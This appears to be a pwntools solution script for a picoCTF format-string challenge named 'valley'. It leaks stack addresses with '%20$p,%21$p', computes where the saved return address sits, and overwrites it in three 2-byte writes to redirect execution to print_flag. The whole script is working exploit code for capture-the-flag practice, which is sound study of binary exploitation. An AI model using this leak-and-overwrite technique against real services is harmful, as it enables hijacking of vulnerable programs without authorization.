from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# 5(register) + 14(stack) + 1(SFP) + 1(RET) + 1(SFP)
p = remote('shape-facility.picoctf.net', 57550)
e = ELF('valley')
p.recvline()
p.sendline(b"%20$p,%21$p")
p.recvuntil(b"distance: ")
addr = p.recvline().decode().strip().split(",")

target_addr = int(addr[0], 16) - 8
target_val = int(addr[1], 16) - 18 - e.sym['main'] + e.sym['print_flag']
log.info(f"offset: {-18 - e.sym['main'] + e.sym['print_flag']}")
log.info(f"{hex(target_addr)}: {hex(target_val)}")

# fmtstr payload
p.sendline(fmtstr_payload(6, {target_addr: target_val & 0xffff}))
p.sendline(fmtstr_payload(6, {target_addr+2: (target_val >> 16) & 0xffff}))
p.sendline(fmtstr_payload(6, {target_addr+4: (target_val >> 32) & 0xffff}))
p.sendline(b"exit")
p.interactive()